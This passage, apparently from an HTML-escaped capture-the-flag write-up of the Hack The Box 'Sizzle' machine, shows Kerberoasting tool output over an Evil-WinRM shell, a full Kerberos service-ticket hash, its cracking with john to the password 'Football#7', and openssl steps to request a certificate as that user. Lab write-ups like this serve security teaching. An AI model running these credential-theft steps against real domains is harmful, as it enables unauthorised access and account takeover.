-  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/___&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;____&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;____&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;____&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_____&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;____&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2.2.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Action:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Kerberoasting&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TGT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/ticket&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tickets&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Target&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;htb.local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ticket&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;successfully&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imported&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Searching&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LDAP://sizzle.HTB.LOCAL/DC=htb,DC=local&apos;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;(&amp;amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&apos;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Total&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kerberoastable&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SamAccountName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mrlky&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DistinguishedName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mrlky&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LOCAL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ServicePrincipalName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http/sizzle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PwdLastSet&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;7/10/2018&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2:08:09&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Supported&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ETypes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RC4_HMAC_DEFAULT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Hash&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;written&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\Temp\hashes.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Roasted&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hashes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;written&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\Temp\hashes.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\Temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hashes.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$krb5tgs$23&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mrlky&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$htb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$http&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/sizzle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DFA01D4481647E449CDDC7A4B00B1254$BCCBCCEC749226F857A544C5897229D822068A56336CFA7099BD16C310E9660CD8A0F34735D87478CF0B60E42C6AFEE2DE177CC6AD00A52BBF3CF0DCA1DC7ED9BE9213338BA1E4147F2EFDAC1D33971B21378BF95F688604BEBA2E1D0C52DFCE5E4A837A63EF0C1A719136407144A09C5A787750AA33BDE04A24C50D092F617A474D9F0CAF18DEB3F331805415BE488E21D71AF81D9CBA565455C685BEE462C2287EAA1A54451D85BF103CB5BEE254BF60C3BB7759E566AFD1481A3DEB5453DEC16929C4D5BFBF50730B53F1AA146165F4E29FE0871C9AA13B6D94058B93AA05ACD0313F158059A67636FDD763D841E540628FFA0EF558E8C535830533BCEC744C3AD7B54B700A313220808C2F52B921E91234C9FDBA806EEE73F48D0633DE37A222D0A2B28F0179463CBAE5AF0AC7D8476BAE60BEB3C1A1750421BF863F984172375077F3DB2EDC941535C07B01252EC265A2130B2E191CE12757C8D1676A424B4B3EA8EE2CC38E3C0EB7614E06E6956443AAFD56171E7FD08875C3F5DDA3590491E96FDCD66094B49CEBF204F2592771729C183CB6F8DECC4375407ACCF32947F689B713287B261BB32F0D16F770498D907E21ED40C8C7AE8CC76043FD513F966B9A1EBDFF5635EA4215DBFCEC11F0485E1E47553C70CB406877AB509433B33660CC3931F32DAEC6F231B6B0AE4E725422566C8792E3C06572156119E6E62E64B8E6DBF5F8ED2F9F61D237C0759D194AB27C540A72BBE3221B144B8FA348D9CE9AE9FDB40429C5C1D1442973D9A68F22562CDBA72E1A5AD052142D18EA3B859E19297DEFBF700560E2E0C5EC81BFBE445B2C86158556232D319CDC68FD79F122F3C821A6162A8D7A24123C1290046358F741FEA227C8411DCA128DA36573DD7D57D86AAFDD88A55FB0D64053911267CC9C4E62BC6B437FFD1212F963D5645E38C83E96AECE9A069E9CC52E79443BDD3C9337FA27FDA7B7957453736CA9E376C0F32592EBD7BC0961FC5719F00E70D2505E2980308410A58CD6764226B522E0BB67AE3C8287CA5AEB2D7FF70B6CF35DB4633739D4DA2B4CB5F3756D7F5769235AA378646A361B4B04945F858831D72526780FB402F806633EF29E09EC7FEB5EE86378D2715AD820090E1D2AC8FE0837E62B4C86815384A42EAF552661C79CACF786D5FC5114FEF24F4C080D330F8C92A675B169816C84D80071E95CC1501EA9942DA81313F3B0ED14BD33379B13907CF7C5E0E1DD98529B&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now let’s crack:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$krb5tgs$23$*mrlky$htb.local$http/sizzle*$DFA01D4481647E449CDDC7A4B00B1254$BCCBCCEC749226F857A544C5897229D822068A56336CFA7099BD16C310E9660CD8A0F34735D87478CF0B60E42C6AFEE2DE177CC6AD00A52BBF3CF0DCA1DC7ED9BE9213338BA1E4147F2EFDAC1D33971B21378BF95F688604BEBA2E1D0C52DFCE5E4A837A63EF0C1A719136407144A09C5A787750AA33BDE04A24C50D092F617A474D9F0CAF18DEB3F331805415BE488E21D71AF81D9CBA565455C685BEE462C2287EAA1A54451D85BF103CB5BEE254BF60C3BB7759E566AFD1481A3DEB5453DEC16929C4D5BFBF50730B53F1AA146165F4E29FE0871C9AA13B6D94058B93AA05ACD0313F158059A67636FDD763D841E540628FFA0EF558E8C535830533BCEC744C3AD7B54B700A313220808C2F52B921E91234C9FDBA806EEE73F48D0633DE37A222D0A2B28F0179463CBAE5AF0AC7D8476BAE60BEB3C1A1750421BF863F984172375077F3DB2EDC941535C07B01252EC265A2130B2E191CE12757C8D1676A424B4B3EA8EE2CC38E3C0EB7614E06E6956443AAFD56171E7FD08875C3F5DDA3590491E96FDCD66094B49CEBF204F2592771729C183CB6F8DECC4375407ACCF32947F689B713287B261BB32F0D16F770498D907E21ED40C8C7AE8CC76043FD513F966B9A1EBDFF5635EA4215DBFCEC11F0485E1E47553C70CB406877AB509433B33660CC3931F32DAEC6F231B6B0AE4E725422566C8792E3C06572156119E6E62E64B8E6DBF5F8ED2F9F61D237C0759D194AB27C540A72BBE3221B144B8FA348D9CE9AE9FDB40429C5C1D1442973D9A68F22562CDBA72E1A5AD052142D18EA3B859E19297DEFBF700560E2E0C5EC81BFBE445B2C86158556232D319CDC68FD79F122F3C821A6162A8D7A24123C1290046358F741FEA227C8411DCA128DA36573DD7D57D86AAFDD88A55FB0D64053911267CC9C4E62BC6B437FFD1212F963D5645E38C83E96AECE9A069E9CC52E79443BDD3C9337FA27FDA7B7957453736CA9E376C0F32592EBD7BC0961FC5719F00E70D2505E2980308410A58CD6764226B522E0BB67AE3C8287CA5AEB2D7FF70B6CF35DB4633739D4DA2B4CB5F3756D7F5769235AA378646A361B4B04945F858831D72526780FB402F806633EF29E09EC7FEB5EE86378D2715AD820090E1D2AC8FE0837E62B4C86815384A42EAF552661C79CACF786D5FC5114FEF24F4C080D330F8C92A675B169816C84D80071E95CC1501EA9942DA81313F3B0ED14BD33379B13907CF7C5E0E1DD98529B&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; mrlky
-
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt mrlky
-Using default input encoding: UTF-8
-Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5tgs, Kerberos 5 TGS etype 23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Will run 8 OpenMP threads
-Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
-Football#7       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1g 0:00:00:04 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2026-06-18 02:05&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.2320g/s 2591Kp/s 2591Kc/s 2591KC/s Francisfer..Flubb3r
-Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
-Session completed.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Here we go, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Now repeat the same process as before with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amanda&lt;/code&gt; to get a valid certificate in order to log in:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl genrsa &lt;span class=&quot;nt&quot;&gt;-des3&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; mrlky.key 2048 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-  openssl req &lt;span class=&quot;nt&quot;&gt;-new&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; mrlky.key &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; mrlky.csr &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-  openssl rsa &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; mrlky.key &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; mrlky.key
-Enter PEM pass phrase:&amp;lt;Football#7&amp;gt;
-Verifying - Enter PEM pass phrase:&amp;lt;Football#7&amp;gt;
-Enter pass phrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;mrlky.key:&amp;lt;Football#7&amp;gt;
-You are about to be asked to enter information that will be incorporated
-into your certificate request.
-What you are about to enter is what is called a Distinguished Name or a DN.
-There are quite a few fields but you can leave some blank
-For some fields there will be a default value,
-If you enter &lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt;, the field will be left blank.
-&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
-Country Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 letter code&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;AU]:
-State or Province Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;full name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Some-State]:
-Locality Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, city&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-Organization Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, company&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Internet Widgits Pty Ltd]:
-Organizational Unit Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, section&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-Common Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. server FQDN or YOUR name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-Email Address &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-
-Please enter the following &lt;span class=&quot;s1&quot;&gt;&apos;extra&apos;&lt;/span&gt; attributes
-to be sent with your certificate request
-A challenge password &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-An optional company name &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-Enter pass phrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;mrlky.key:&amp;lt;Football#7&amp;gt;
-writing RSA key
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;In order to get a valid csr as mrlky and not amanda, make sure to issue a csr in an incognito tab. Otherwise, being logged in as amanda, the certs you will get will always be issued for amanda!&lt;/p&gt;
-&lt;/blockquote&gt;
-
